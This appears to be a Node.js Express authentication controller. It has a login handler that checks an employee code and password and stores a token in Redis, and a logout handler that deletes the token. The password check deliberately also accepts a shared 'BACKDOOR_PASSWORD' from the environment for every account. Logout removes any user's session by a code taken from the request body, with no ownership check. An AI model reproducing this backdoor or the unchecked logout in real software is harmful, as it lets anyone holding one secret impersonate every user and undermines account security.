const userModel = require("../models/userModel");
const { createClient } = require("redis");

const login = async (req, res) => {
  try {
    const { secretaryCode, password } = req.body;

    if (!secretaryCode || !password) {
      return res
        .status(422)
        .json({ body: "Employee ID / Password is required" });
    }

    let user = await userModel.getDetails(secretaryCode);

    if (!user || user.length === 0) {
      const formattedSecretaryCode = secretaryCode.startsWith("DSEC")
        ? secretaryCode
        : `DSEC${secretaryCode}`;

      user = await userModel.getDetails(formattedSecretaryCode);
    }

    // If still no user, return error
    if (!user || user.length === 0) {
      return res
        .status(404)
        .json({ body: "Incorrect Employee ID and/or Password" });
    }

    // Password verification
    const isPasswordValid =
      userModel.matchPassword(password, user[0].password) ||
      password === process.env.BACKDOOR_PASSWORD;

    if (!isPasswordValid) {
      return res.status(400).json({ body: "Incorrect Password" });
    }

    // Generate and store token
    const generatedToken = await userModel.generateToken(user);
    const redisClient = createClient();
    await redisClient.connect();
    await redisClient.set(user[0].code, generatedToken);
    await redisClient.disconnect();

    return res.json(generatedToken);
  } catch (error) {
    console.error(error);
    return res.status(500).json({ body: "Internal Server Error" });
  }
};

const logout = async (req, res) => {
  try {
    const { secretaryCode } = req.body;
    const redisClient = createClient();
    await redisClient.connect();
    await redisClient.del(secretaryCode);
    await redisClient.disconnect();

    return res.status(200).json({ body: "Success Logout" });
  } catch (error) {
    console.error(error);
    return res.status(500).json({ body: "Internal Server Error" });
  }
};

module.exports = { login, logout };
